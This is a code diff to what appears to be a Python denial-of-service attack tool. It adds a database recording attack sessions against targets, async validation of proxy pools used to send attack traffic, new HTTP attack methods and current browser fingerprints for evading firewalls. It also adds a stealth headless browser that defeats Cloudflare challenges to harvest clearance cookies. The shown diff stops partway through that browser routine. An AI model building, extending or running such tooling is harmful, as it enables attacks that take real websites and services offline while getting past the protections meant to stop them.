@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 
+import asyncio
 import logging
 import random
 import re
@@ -9,7 +10,7 @@ import sys
 from base64 import b64encode
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
-from datetime import datetime
+from datetime import datetime, timedelta
 from itertools import cycle
 from json import load
 from logging import basicConfig, getLogger, shutdown
@@ -47,6 +48,7 @@ from uuid import UUID, uuid4
 
 import psutil
 import requests
+import aiohttp
 from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
 from PyRoxy import Tools as ProxyTools
 from certifi import where
@@ -59,13 +61,74 @@ from requests import Response, Session, get, cookies
 from yarl import URL
 
 try:
+    import nodriver
+    NODRIVER_INSTALLED = True
+except ImportError:
+    NODRIVER_INSTALLED = False
+
+try:
     from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
     PLAYWRIGHT_INSTALLED = True
 except ImportError:
     PLAYWRIGHT_INSTALLED = False
 
-# --- Tactical Configuration (v1.1.3) ---
-__version__: str = "1.1.6"
+try:
+    from playwright_stealth import Stealth
+    STEALTH_INSTALLED = True
+except ImportError:
+    STEALTH_INSTALLED = False
+
+try:
+    from curl_cffi.requests import AsyncSession as CurlSession
+    CURL_CFFI_INSTALLED = True
+except ImportError:
+    CURL_CFFI_INSTALLED = False
+
+try:
+    import httpx
+    HTTPX_INSTALLED = True
+except ImportError:
+    HTTPX_INSTALLED = False
+
+# --- Windows asyncio Proactor OSError 10057 Workaround ---
+if sys.platform.lower().startswith("win") and sys.version_info >= (3, 8):
+    try:
+        from functools import wraps
+        from asyncio.proactor_events import _ProactorBasePipeTransport
+        
+        def silence_win_error_10057(func):
+            @wraps(func)
+            def wrapper(self, *args, **kwargs):
+                try:
+                    return func(self, *args, **kwargs)
+                except OSError as e:
+                    if getattr(e, 'winerror', None) == 10057:
+                        return
+                    raise
+            return wrapper
+
+        _ProactorBasePipeTransport._call_connection_lost = silence_win_error_10057(
+            _ProactorBasePipeTransport._call_connection_lost
+        )
+    except Exception:
+        pass
+
+# --- Asyncio StreamWriter Context Manager Patch ---
+async def _streamwriter_aenter(self):
+    return self
+
+async def _streamwriter_aexit(self, exc_type, exc_val, exc_tb):
+    try:
+        self.close()
+        await self.wait_closed()
+    except Exception:
+        pass
+
+asyncio.StreamWriter.__aenter__ = _streamwriter_aenter
+asyncio.StreamWriter.__aexit__ = _streamwriter_aexit
+
+# --- Tactical Configuration (v1.2.1) ---
+__version__: str = "1.2.1"
 __dir__: Path = Path(__file__).parent
 
 # Setup High-Signal Logging
@@ -90,11 +153,7 @@ ctx.check_hostname = False
 ctx.verify_mode = CERT_NONE
 if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
     ctx.minimum_version = ssl.TLSVersion.TLSv1_2
-# Disable insecure TLS versions for additional safety (defense-in-depth)
-if hasattr(ssl, "OP_NO_TLSv1"):
-    ctx.options |= ssl.OP_NO_TLSv1
-if hasattr(ssl, "OP_NO_TLSv1_1"):
-    ctx.options |= ssl.OP_NO_TLSv1_1
+
 
 __ip__: Any = None
 tor2webs = [
@@ -159,7 +218,11 @@ def exit(*message: str) -> None:
     if message:
         logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET)
     shutdown()
-    _exit(1)
+    # Ensure logs reach the pipe before we kill the process tree
+    sys.stdout.flush()
+    sys.stderr.flush()
+    import os
+    os._exit(1)
 
 
 # --- Persistent Intelligence Database ---
@@ -185,7 +248,66 @@ class IntelligenceDB:
                     last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                 )
             ''')
+            # --- Attack History Tables ---
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS attack_sessions (
+                    session_id TEXT PRIMARY KEY,
+                    target TEXT NOT NULL,
+                    method TEXT NOT NULL,
+                    threads INTEGER,
+                    duration_planned INTEGER,
+                    duration_actual REAL,
+                    proxy_type TEXT,
+                    proxy_count INTEGER DEFAULT 0,
+                    start_time TIMESTAMP,
+                    end_time TIMESTAMP,
+                    exit_status TEXT DEFAULT 'running',
+                    total_requests INTEGER DEFAULT 0,
+                    total_bytes INTEGER DEFAULT 0,
+                    avg_latency REAL DEFAULT 0.0,
+                    peak_pps INTEGER DEFAULT 0,
+                    peak_bps INTEGER DEFAULT 0
+                )
+            ''')
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS attack_metrics (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    session_id TEXT NOT NULL,
+                    timestamp TIMESTAMP NOT NULL,
+                    pps INTEGER DEFAULT 0,
+                    bps INTEGER DEFAULT 0,
+                    latency REAL DEFAULT 0.0,
+                    cpu_percent REAL DEFAULT 0.0,
+                    ram_percent REAL DEFAULT 0.0,
+                    FOREIGN KEY (session_id) REFERENCES attack_sessions(session_id)
+                )
+            ''')
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS attack_events (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    session_id TEXT NOT NULL,
+                    timestamp TIMESTAMP NOT NULL,
+                    event_type TEXT NOT NULL,
+                    message TEXT,
+                    FOREIGN KEY (session_id) REFERENCES attack_sessions(session_id)
+                )
+            ''')
+            # Index for fast time-range queries on metrics
+            cursor.execute('''
+                CREATE INDEX IF NOT EXISTS idx_metrics_session_time 
+                ON attack_metrics(session_id, timestamp)
+            ''')
+            cursor.execute('''
+                CREATE INDEX IF NOT EXISTS idx_events_session 
+                ON attack_events(session_id)
+            ''')
+            cursor.execute('''
+                CREATE INDEX IF NOT EXISTS idx_sessions_start_time 
+                ON attack_sessions(start_time)
+            ''')
             conn.commit()
+
+    # --- Proxy Intel Methods (existing) ---
 
     def update_proxy_scores(self, proxies: List['TacticalProxy']):
         with self.lock:
@@ -214,7 +336,262 @@ class IntelligenceDB:
                     return {'latency': row[0], 'score': row[1], 'failures': row[2]}
         return None
 
+    # --- Attack History Methods ---
+
+    def create_session(self, session_id: str, target: str, method: str,
+                       threads: int, duration: int, proxy_type: str = "",
+                       proxy_count: int = 0) -> None:
+        """Record a new attack session at launch time."""
+        with self.lock:
+            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
+                cursor = conn.cursor()
+                now = datetime.now().isoformat()
+                cursor.execute('''
+                    INSERT OR REPLACE INTO attack_sessions 
+                    (session_id, target, method, threads, duration_planned, 
+                     proxy_type, proxy_count, start_time, exit_status)
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'running')
+                ''', (session_id, target, method, threads, duration,
+                      proxy_type, proxy_count, now))
+                conn.commit()
+                self.record_event(session_id, 'start',
+                                  f'Attack initiated: {method} -> {target} ({threads} threads, {duration}s)',
+                                  _use_lock=False, _conn=conn)
+
+    def record_metric(self, session_id: str, pps: int, bps: int,
+                      latency: float, cpu_pct: float = 0.0,
+                      ram_pct: float = 0.0) -> None:
+        """Record a single time-series data point (called every ~1s)."""
+        with self.lock:
+            try:
+                with sqlite3.connect(self.db_path, timeout=10.0) as conn:
+                    cursor = conn.cursor()
+                    now = datetime.now().isoformat()
+                    cursor.execute('''
+                        INSERT INTO attack_metrics 
+                        (session_id, timestamp, pps, bps, latency, cpu_percent, ram_percent)
+                        VALUES (?, ?, ?, ?, ?, ?, ?)
+                    ''', (session_id, now, pps, bps, latency, cpu_pct, ram_pct))
+                    conn.commit()
+            except Exception:
+                pass  # Non-blocking: never crash the engine for telemetry
+
+    def record_event(self, session_id: str, event_type: str, message: str,
+                     _use_lock: bool = True, _conn=None) -> None:
+        """Record a significant event during an attack."""
+        def _insert(conn):
+            cursor = conn.cursor()
+            now = datetime.now().isoformat()
+            cursor.execute('''
+                INSERT INTO attack_events (session_id, timestamp, event_type, message)
+                VALUES (?, ?, ?, ?)
+            ''', (session_id, now, event_type, message))
+            conn.commit()
+
+        try:
+            if _conn:
+                _insert(_conn)
+            else:
+                if _use_lock:
+                    with self.lock:
+                        with sqlite3.connect(self.db_path, timeout=10.0) as conn:
+                            _insert(conn)
+                else:
+                    with sqlite3.connect(self.db_path, timeout=10.0) as conn:
+                        _insert(conn)
+        except Exception:
+            pass
+
+    def finalize_session(self, session_id: str, exit_status: str = 'completed') -> None:
+        """Finalize a session with aggregated stats when attack ends."""
+        with self.lock:
+            try:
+                with sqlite3.connect(self.db_path, timeout=30.0) as conn:
+                    cursor = conn.cursor()
+                    now = datetime.now().isoformat()
+                    # Calculate aggregates from recorded metrics
+                    cursor.execute('''
+                        SELECT 
+                            COALESCE(SUM(pps), 0),
+                            COALESCE(SUM(bps), 0),
+                            COALESCE(AVG(CASE WHEN latency > 0 THEN latency END), 0.0),
+                            COALESCE(MAX(pps), 0),
+                            COALESCE(MAX(bps), 0)
+                        FROM attack_metrics WHERE session_id = ?
+                    ''', (session_id,))
+                    row = cursor.fetchone()
+                    total_req, total_bytes, avg_lat, peak_pps, peak_bps = row if row else (0, 0, 0.0, 0, 0)
+
+                    # Calculate actual duration
+                    cursor.execute('''
+                        SELECT start_time FROM attack_sessions WHERE session_id = ?
+                    ''', (session_id,))
+                    start_row = cursor.fetchone()
+                    duration_actual = 0.0
+                    if start_row and start_row[0]:
+                        try:
+                            start_dt = datetime.fromisoformat(start_row[0])
+                            duration_actual = (datetime.now() - start_dt).total_seconds()
+                        except Exception:
+                            pass
+
+                    cursor.execute('''
+                        UPDATE attack_sessions SET
+                            end_time = ?,
+                            exit_status = ?,
+                            duration_actual = ?,
+                            total_requests = ?,
+                            total_bytes = ?,
+                            avg_latency = ?,
+                            peak_pps = ?,
+                            peak_bps = ?
+                        WHERE session_id = ?
+                    ''', (now, exit_status, duration_actual, total_req, total_bytes,
+                          avg_lat, peak_pps, peak_bps, session_id))
+                    conn.commit()
+                    self.record_event(session_id, 'end',
+                                      f'Attack {exit_status}: duration={duration_actual:.1f}s, '
+                                      f'total_req={total_req}, total_bytes={total_bytes}',
+                                      _use_lock=False, _conn=conn)
+            except Exception as e:
+                logger.debug(f"[!] History DB finalize error: {e}")
+
+    def get_session_list(self, limit: int = 50, offset: int = 0) -> List[Dict]:
+        """Return a list of past attack sessions, newest first."""
+        with self.lock:
+            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
+                conn.row_factory = sqlite3.Row
+                cursor = conn.cursor()
+                cursor.execute('''
+                    SELECT * FROM attack_sessions 
+                    ORDER BY start_time DESC LIMIT ? OFFSET ?
+                ''', (limit, offset))
+                return [dict(row) for row in cursor.fetchall()]
+
+    def get_session_detail(self, session_id: str) -> Optional[Dict]:
+        """Return full details for a single session."""
+        with self.lock:
+            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
+                conn.row_factory = sqlite3.Row
+                cursor = conn.cursor()
+                cursor.execute('SELECT * FROM attack_sessions WHERE session_id = ?', (session_id,))
+                row = cursor.fetchone()
+                return dict(row) if row else None
+
+    def get_session_metrics(self, session_id: str) -> List[Dict]:
+        """Return time-series metrics for a session."""
+        with self.lock:
+            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
+                conn.row_factory = sqlite3.Row
+                cursor = conn.cursor()
+                cursor.execute('''
+                    SELECT timestamp, pps, bps, latency, cpu_percent, ram_percent
+                    FROM attack_metrics WHERE session_id = ?
+                    ORDER BY timestamp ASC
+                ''', (session_id,))
+                return [dict(row) for row in cursor.fetchall()]
+
+    def get_session_events(self, session_id: str) -> List[Dict]:
+        """Return event log for a session."""
+        with self.lock:
+            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
+                conn.row_factory = sqlite3.Row
+                cursor = conn.cursor()
+                cursor.execute('''
+                    SELECT timestamp, event_type, message
+                    FROM attack_events WHERE session_id = ?
+                    ORDER BY timestamp ASC
+                ''', (session_id,))
+                return [dict(row) for row in cursor.fetchall()]
+
+    def get_global_stats(self) -> Dict:
+        """Return global attack statistics."""
+        with self.lock:
+            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
+                cursor = conn.cursor()
+                cursor.execute('SELECT COUNT(*) FROM attack_sessions')
+                total_sessions = cursor.fetchone()[0]
+                cursor.execute('SELECT COUNT(*) FROM attack_sessions WHERE exit_status = "completed"')
+                completed = cursor.fetchone()[0]
+                cursor.execute('''
+                    SELECT method, COUNT(*) as cnt FROM attack_sessions 
+                    GROUP BY method ORDER BY cnt DESC LIMIT 1
+                ''')
+                top_method_row = cursor.fetchone()
+                top_method = top_method_row[0] if top_method_row else "N/A"
+                cursor.execute('''
+                    SELECT COALESCE(SUM(total_requests), 0), 
+                           COALESCE(SUM(total_bytes), 0),
+                           COALESCE(AVG(duration_actual), 0)
+                    FROM attack_sessions WHERE exit_status != 'running'
+                ''')
+                agg = cursor.fetchone()
+                return {
+                    'total_sessions': total_sessions,
+                    'completed_sessions': completed,
+                    'top_method': top_method,
+                    'lifetime_requests': agg[0],
+                    'lifetime_bytes': agg[1],
+                    'avg_duration': round(agg[2], 1),
+                }
+
+    def delete_session(self, session_id: str) -> bool:
+        """Delete a session and all related metrics/events."""
+        with self.lock:
+            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
+                cursor = conn.cursor()
+                cursor.execute('DELETE FROM attack_metrics WHERE session_id = ?', (session_id,))
+                cursor.execute('DELETE FROM attack_events WHERE session_id = ?', (session_id,))
+                cursor.execute('DELETE FROM attack_sessions WHERE session_id = ?', (session_id,))
+                conn.commit()
+                return cursor.rowcount > 0
+
+    def cleanup_old_data(self, days: int = 30) -> int:
+        """Auto-purge attack metrics older than N days. Keep session summaries."""
+        with self.lock:
+            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
+                cursor = conn.cursor()
+                cutoff = (datetime.now() - timedelta(days=days)).isoformat()
+                # Delete old metrics (heavy data) but keep session summaries
+                cursor.execute('''
+                    DELETE FROM attack_metrics WHERE session_id IN (
+                        SELECT session_id FROM attack_sessions WHERE start_time < ?
+                    )
+                ''', (cutoff,))
+                metrics_deleted = cursor.rowcount
+                cursor.execute('''
+                    DELETE FROM attack_events WHERE session_id IN (
+                        SELECT session_id FROM attack_sessions WHERE start_time < ?
+                    )
+                ''', (cutoff,))
+                # Delete very old sessions entirely (older than 2x retention)
+                very_old = (datetime.now() - timedelta(days=days * 2)).isoformat()
+                cursor.execute('DELETE FROM attack_sessions WHERE start_time < ?', (very_old,))
+                conn.commit()
+                if metrics_deleted > 0:
+                    logger.info(f"{bcolors.OKCYAN}[*] History DB: Auto-cleanup purged {metrics_deleted} old metric records.{bcolors.RESET}")
+                return metrics_deleted
+
+
+class HistoryCleanupDaemon(Thread):
+    """Background thread that runs cleanup every 24 hours."""
+    def __init__(self, db: IntelligenceDB, retention_days: int = 30):
+        Thread.__init__(self, daemon=True)
+        self.db = db
+        self.retention_days = retention_days
+
+    def run(self):
+        # Initial cleanup on startup
+        sleep(10)
+        self.db.cleanup_old_data(self.retention_days)
+        while True:
+            sleep(86400)  # 24 hours
+            self.db.cleanup_old_data(self.retention_days)
+
+
 INTEL_DB = IntelligenceDB()
+# Start background cleanup daemon (30-day retention)
+HistoryCleanupDaemon(INTEL_DB, retention_days=30).start()
 
 # --- Dynamic Scaling Globals ---
 class EngineState:
@@ -294,6 +671,8 @@ class Methods:
         "TOR",
         "RHEX",
         "STOMP",
+        "IMPERSONATE",
+        "HTTP3",
     }
 
     LAYER4_AMP: Set[str] = {"MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"}
@@ -365,51 +744,61 @@ search_engine_agents = [
 
 class Counter:
     def __init__(self, value: int = 0) -> None:
-        self._value = RawValue("i", value)
+        self._value = RawValue("Q", value) # Use Unsigned Long Long (64-bit) for BPS/PPS
+        self._lock = Lock()
 
     def __iadd__(self, value: int) -> "Counter":
-        self._value.value += value
+        with self._lock:
+            self._value.value += value
         return self
 
     def __int__(self) -> int:
-        return self._value.value
+        with self._lock:
+            return self._value.value
 
     def set(self, value: int) -> "Counter":
-        self._value.value = value
+        with self._lock:
+            self._value.value = value
         return self
 
 
 REQUESTS_SENT = Counter()
 BYTES_SEND = Counter()
+SUCCESS_SENT = Counter() # 2xx/3xx
+WAF_SENT = Counter()     # 4xx (Blocked/Mitigated)
+ERROR_SENT = Counter()   # 5xx (Server Crash)
+TIMEOUT_SENT = Counter() # Socket Timeouts
 CURRENT_LATENCY = RawValue("d", 0.0)
 DYNAMIC_RPC = RawValue("i", 100)
 
 
-class HealthMonitor(Thread):
+class HealthMonitor:
     def __init__(
         self, target_host: str, port: int, method_type: str, interval: int = 2
     ):
-        Thread.__init__(self, daemon=True)
         self.target_host = target_host
         self.port = port
         self.method_type = method_type
         self.interval = interval
 
-    def run(self):
+    async def run(self):
         while True:
             try:
                 start_t = time()
                 if self.method_type == "L7":
-                    with get(f"http://{self.target_host}:{self.port}", timeout=2) as r:
-                        pass
+                    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
+                        async with session.get(f"http://{self.target_host}:{self.port}", timeout=2):
+                            pass
                 else:
-                    with socket(AF_INET, SOCK_STREAM) as s:
-                        s.settimeout(2)
-                        s.connect((self.target_host, self.port))
+                    # Async socket connect check for L4
+                    reader, writer = await asyncio.open_connection(self.target_host, self.port)
+                    writer.close()
+                    await writer.wait_closed()
+                
                 CURRENT_LATENCY.value = (time() - start_t) * 1000
             except Exception:
                 CURRENT_LATENCY.value = -1.0  # -1 means offline or timeout
-            sleep(self.interval)
+            await asyncio.sleep(self.interval)
 
 
 class TacticalProxy:
@@ -438,7 +827,7 @@ class TacticalProxy:
 
 class TacticalProxyValidator:
     @staticmethod
-    def validate_and_score(raw_proxies: Set[Proxy], target_url: str = None, is_layer7: bool = True, is_udp: bool = False) -> List[TacticalProxy]:
+    async def validate_and_score(raw_proxies: Set[Proxy], target_url: str = None, is_layer7: bool = True, is_udp: bool = False) -> List[TacticalProxy]:
         tactical_proxies = []
         total_raw = len(raw_proxies)
         
@@ -465,66 +854,71 @@ class TacticalProxyValidator:
             else:
                 target_host = target_url
 
-        def _check(proxy: Proxy) -> TacticalProxy:
-            p_str = str(proxy)
-            intel = INTEL_DB.get_proxy_intel(p_str)
-            
-            # If we have recent, high-quality intel, skip active verification to speed up deployment
-            if intel and intel['failures'] < 3 and intel['latency'] < 1500:
-                p = TacticalProxy(proxy, intel['latency'], True)
-                p.score = intel['score']
-                p.fail_count = intel['failures']
-                return p
+        semaphore = asyncio.Semaphore(500)
+
+        async def _check(proxy: Proxy) -> Optional[TacticalProxy]:
+            async with semaphore:
+                p_str = str(proxy)
+                intel = await asyncio.to_thread(INTEL_DB.get_proxy_intel, p_str)
                 
-            start_time = time()
-            try:
-                # 1. Connection Check
-                s = proxy.open_socket(timeout=3)
-                if not s: 
-                    return TacticalProxy(proxy, 2500.0, False)
-                
-                is_verified = False
-                # 2. SSL Handshake for L7 HTTPS
-                if requires_ssl and is_layer7:
-                    try:
-                        s.settimeout(3)
-                        s = ctx.wrap_socket(s, server_hostname=target_host, do_handshake_on_connect=True)
-                        is_verified = True
-                    except:
-                        with suppress(Exception): s.close()
-                        return TacticalProxy(proxy, 2000.0, False)
-                
-                # 3. UDP Associate Check for SOCKS5/UDP
-                elif is_udp and proxy.type == ProxyType.SOCKS5:
-                    try:
-                        s.settimeout(3)
-                        s.sendall(b"\x05\x03\x00\x01\x00\x00\x00\x00\x00\x00")
-                        res = s.recv(10)
-                        if res and res[1] == 0x00:
+                # If we have recent, high-quality intel, skip active verification to speed up deployment
+                if intel and intel['failures'] < 3 and intel['latency'] < 1500:
+                    p = TacticalProxy(proxy, intel['latency'], True)
+                    p.score = intel['score']
+                    p.fail_count = intel['failures']
+                    return p
+                    
+                start_time = time()
+                try:
+                    # 1. Connection Check
+                    # PyRoxy open_socket is synchronous, run in thread to avoid blocking loop
+                    s = await asyncio.to_thread(proxy.open_socket, timeout=3)
+                    if not s: 
+                        return TacticalProxy(proxy, 2500.0, False)
+                    
+                    is_verified = False
+                    # 2. SSL Handshake for L7 HTTPS
+                    if requires_ssl and is_layer7:
+                        try:
+                            s.settimeout(3)
+                            # SSL wrap is also blocking
+                            s = await asyncio.to_thread(ctx.wrap_socket, s, server_hostname=target_host, do_handshake_on_connect=True)
                             is_verified = True
-                        else:
+                        except:
+                            with suppress(Exception): s.close()
+                            return TacticalProxy(proxy, 2000.0, False)
+                    
+                    # 3. UDP Associate Check for SOCKS5/UDP
+                    elif is_udp and proxy.type == ProxyType.SOCKS5:
+                        try:
+                            s.settimeout(3)
+                            await asyncio.to_thread(s.sendall, b"\x05\x03\x00\x01\x00\x00\x00\x00\x00\x00")
+                            res = await asyncio.to_thread(s.recv, 10)
+                            if res and res[1] == 0x00:
+                                is_verified = True
+                            else:
+                                with suppress(Exception): s.close()
+                                return TacticalProxy(proxy, 2200.0, False)
+                        except:
                             with suppress(Exception): s.close()
                             return TacticalProxy(proxy, 2200.0, False)
-                    except:
-                        with suppress(Exception): s.close()
-                        return TacticalProxy(proxy, 2200.0, False)
-                else:
-                    is_verified = True
+                    else:
+                        is_verified = True
 
-                latency = (time() - start_time) * 1000
-                with suppress(Exception): s.close()
-                return TacticalProxy(proxy, latency, is_verified)
-            except:
-                return TacticalProxy(proxy, 3000.0, False)
+                    latency = (time() - start_time) * 1000
+                    with suppress(Exception): s.close()
+                    return TacticalProxy(proxy, latency, is_verified)
+                except:
+                    return TacticalProxy(proxy, 3000.0, False)
 
-        max_workers = min(800, total_raw)
-        with ThreadPoolExecutor(max_workers=max_workers) as executor:
-            futures = [executor.submit(_check, p) for p in raw_proxies]
-            for future in as_completed(futures):
-                try:
-                    result = future.result()
-                    if result: tactical_proxies.append(result)
-                except: continue
+        try:
+            tasks = [_check(p) for p in raw_proxies]
+            results = await asyncio.wait_for(asyncio.gather(*tasks), timeout=60)
+            tactical_proxies = [r for r in results if r is not None]
+        except asyncio.TimeoutError:
+            logger.warning(f"{bcolors.WARNING}[!] Resource: Validation timed out after 60s. Proceeding with partially validated pool.{bcolors.RESET}")
+            # Filter results from tasks that completed
+            tactical_proxies = [t.result() for t in tasks if t.done() and not t.cancelled() and t.result()]
 
         elite_count = len([p for p in tactical_proxies if p.latency_ms < 1000])
         logger.info(
@@ -532,7 +926,7 @@ class TacticalProxyValidator:
         )
         
         tactical_proxies.sort(key=lambda p: p.score, reverse=True)
-        INTEL_DB.update_proxy_scores(tactical_proxies)
+        await asyncio.to_thread(INTEL_DB.update_proxy_scores, tactical_proxies)
         return tactical_proxies
 
 
@@ -676,7 +1070,7 @@ class ReloadSentinel(Thread):
                 logger.warning(f"{bcolors.FAIL}[!] Sentinel Alert: Tactical Pool Depleted ({self.pool.get_tactical_size()} active). Executing Emergency Sourcing.{bcolors.RESET}")
                 raw_emergency = AutonomousHarvester.emergency_harvest(self.proxy_ty)
                 if raw_emergency:
-                    scored_emergency = TacticalProxyValidator.validate_and_score(raw_emergency, str(self.url) if self.url else None)
+                    scored_emergency = asyncio.run(TacticalProxyValidator.validate_and_score(raw_emergency, str(self.url) if self.url else None))
                     self.pool.update_pool(scored_emergency)
                     continue
 
@@ -693,7 +1087,7 @@ class ReloadSentinel(Thread):
                     if isinstance(new_proxies, list) and len(new_proxies) > 0 and isinstance(new_proxies[0], TacticalProxy):
                         self.pool.update_pool(new_proxies)
                     else:
-                        scored = TacticalProxyValidator.validate_and_score(set(new_proxies), str(self.url) if self.url else None)
+                        scored = asyncio.run(TacticalProxyValidator.validate_and_score(set(new_proxies), str(self.url) if self.url else None))
                         self.pool.update_pool(scored)
             except Exception as e:
                 logger.error(
@@ -833,13 +1227,13 @@ class MLSmartBypassEngine:
         self.lock = Lock()
         self.fingerprints = [
             {
-                "id": "chrome_win",
-                "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                "id": "chrome_win_133",
+                "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
                 "headers": (
                     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
-                    "Accept-Encoding: gzip, deflate, br\r\n"
+                    "Accept-Encoding: gzip, deflate, br, zstd\r\n"
                     "Accept-Language: en-US,en;q=0.9\r\n"
-                    "Sec-Ch-Ua: \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"\r\n"
+                    "Sec-Ch-Ua: \"Chromium\";v=\"133\", \"Google Chrome\";v=\"133\", \"Not-A.Brand\";v=\"99\"\r\n"
                     "Sec-Ch-Ua-Mobile: ?0\r\n"
                     "Sec-Ch-Ua-Platform: \"Windows\"\r\n"
                     "Sec-Fetch-Dest: document\r\n"
@@ -852,8 +1246,8 @@ class MLSmartBypassEngine:
                 "delay": 0.0
             },
             {
-                "id": "firefox_mac",
-                "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0",
+                "id": "firefox_mac_135",
+                "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0",
                 "headers": (
                     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
                     "Accept-Encoding: gzip, deflate, br\r\n"
@@ -865,11 +1259,11 @@ class MLSmartBypassEngine:
                     "Upgrade-Insecure-Requests: 1\r\n"
                 ),
                 "weight": 10.0,
-                "delay": 0.1 # Slight human-like delay
+                "delay": 0.1
             },
             {
-                "id": "safari_ios",
-                "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+                "id": "safari_ios_18",
+                "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
                 "headers": (
                     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                     "Accept-Encoding: gzip, deflate, br\r\n"
@@ -924,25 +1318,119 @@ class BrowserEngine:
     """Advanced Browser Fingerprinting Engine for bypassing JS/Captcha challenges"""
     
     @staticmethod
-    def solve_cf(url: str, proxy: str = None, timeout: int = 15000):
+    def solve_cf(url: str, proxy: str = None, user_agent: str = None, timeout: int = 45000):
+        if not url.startswith("https://") and not url.startswith("http://"):
+            url = "https://" + url
+        elif url.startswith("http://"):
+            url = url.replace("http://", "https://")
+            
+        logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Initializing stealth browser for {url}...{bcolors.RESET}")
+        
+        if NODRIVER_INSTALLED:
+            logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Nodriver engine activated.{bcolors.RESET}")
+            try:
+                import nodriver as uc
+                
+                async def run_nodriver():
+                    browser_args = [
+                        "--disable-blink-features=AutomationControlled",
+                        "--no-sandbox",
+                        "--disable-setuid-sandbox",
+                        "--window-position=-32000,-32000" if sys.platform.lower().startswith("win") else ""
+                    ]
+                    if proxy:
+                        proxy_url = f"http://{proxy}" if not "://" in proxy else proxy
+                        browser_args.append(f"--proxy-server={proxy_url}")
+                        
+                    browser = await uc.start(browser_args=[arg for arg in browser_args if arg])
+                    page = await browser.get(url)
+                    
+                    logger.info(f"{bcolors.OKCYAN}[*] Headless Recon: Waiting for auto-validation (Max 45s)...{bcolors.RESET}")
+                    
+                    # Dedicated loop to wait for clearance and valid page title
+                    start_wait = time()
+                    title = ""
+                    cookie_str = ""
+                    success = False
+                    
+                    while time() - start_wait < 45:
+                        try:
+                            title = await page.evaluate('document.title')
+                            title_clean = str(title).encode('ascii', 'ignore').decode('ascii') # Prevent UnicodeEncodeError on Windows
+                            
+                            cookies = await browser.cookies.get_all()
+                            cookie_str = "; ".join([f"{c.name}={c.value}" for c in cookies])
+                            
+                            is_challenge = any(k in str(title).lower() for k in [
+                                "just a moment", "checking your browser", "enable javascript", 
+                                "access denied", "attention required", "ddos-guard", "cloudflare"
+                            ])
+                            
+                            if not is_challenge and "cf_clearance" in cookie_str and len(str(title)) > 0:
+                                logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Barrier Breached (Fidelity: HIGH). Page Title: {title_clean}{bcolors.RESET}")
+                                success = True
+                                break
+                        except Exception:
+                            pass
+                        await asyncio.sleep(2)
+                    
+                    if not success:
+                        title_clean = str(title).encode('ascii', 'ignore').decode('ascii') if title else "Unknown"
+                        if "cf_clearance" not in cookie_str:
+                            logger.warning(f"{bcolors.WARNING}[!] Headless Recon: Failed to obtain cf_clearance. Final Title: {title_clean}{bcolors.RESET}")
+                        else:
+                            logger.info(f"{bcolors.OKGREEN}[*] Headless Recon: Clearance Obtained but title still flagged. Proceeding with caution.{bcolors.RESET}")
+                    
+                    try:
+                        ua = await page.evaluate('navigator.userAgent')
+                    except:
+                        ua = None
+                        
+                    try:
+                        # Nodriver stop() may return None or throw exceptions in Windows asyncio
+                        res = browser.stop()
+                        if asyncio.iscoroutine(res):
+                            await res
+                    except Exception as e:
+                        logger.debug(f"[*] Nodriver cleanup info: {e}")
+                        
+                    return cookie_str if "cf_clearance" in cookie_str else None, ua
+
+                # Since solve_cf is run in a Thread via asyncio.to_thread, we need a new loop
+                new_loop = asyncio.new_event_loop()
+                asyncio.set_event_loop(new_loop)
+                cookie_str, ua = new_loop.run_until_complete(run_nodriver())
+                new_loop.close()
+                return cookie_str, ua
+                
+            except Exception as e:
+                logger.error(f"{bcolors.FAIL}[!] Nodriver Recon Failed: {e}. Falling back to Playwright...{bcolors.RESET}")
+        
         if not PLAYWRIGHT_INSTALLED:
-            logger.error("[!] Playwright is not installed. CFBUAM requires playwright. Run: pip install playwright && playwright install chromium")
